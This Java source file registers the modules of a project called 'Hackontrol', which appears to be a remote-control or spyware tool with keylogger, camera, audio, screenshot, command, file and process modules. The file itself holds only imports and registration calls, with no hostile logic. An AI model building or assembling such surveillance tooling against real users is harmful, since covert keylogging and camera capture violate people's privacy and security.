package com.khopan.hackontrol.registration;

import com.khopan.hackontrol.Hackontrol;
import com.khopan.hackontrol.module.AudioModule;
import com.khopan.hackontrol.module.CameraModule;
import com.khopan.hackontrol.module.DialogModule;
import com.khopan.hackontrol.module.HackontrolModule;
import com.khopan.hackontrol.module.ProcessModule;
import com.khopan.hackontrol.module.ScreenshotModule;
import com.khopan.hackontrol.module.command.CommandModule;
import com.khopan.hackontrol.module.control.ControlModule;
import com.khopan.hackontrol.module.file.FileModule;
import com.khopan.hackontrol.module.keylogger.KeyLoggerModule;
import com.khopan.hackontrol.registry.Registry;

public class ModuleRegistry {
	private ModuleRegistry() {}

	public static void register(Registry registry) {
		registry.register(Hackontrol.MODULE_REGISTRY, HackontrolModule.class);
		registry.register(Hackontrol.MODULE_REGISTRY, AudioModule.class);
		registry.register(Hackontrol.MODULE_REGISTRY, CameraModule.class);
		registry.register(Hackontrol.MODULE_REGISTRY, CommandModule.class);
		registry.register(Hackontrol.MODULE_REGISTRY, ControlModule.class);
		registry.register(Hackontrol.MODULE_REGISTRY, DialogModule.class);
		registry.register(Hackontrol.MODULE_REGISTRY, FileModule.class);
		registry.register(Hackontrol.MODULE_REGISTRY, KeyLoggerModule.class);
		registry.register(Hackontrol.MODULE_REGISTRY, ProcessModule.class);
		registry.register(Hackontrol.MODULE_REGISTRY, ScreenshotModule.class);
	}
}
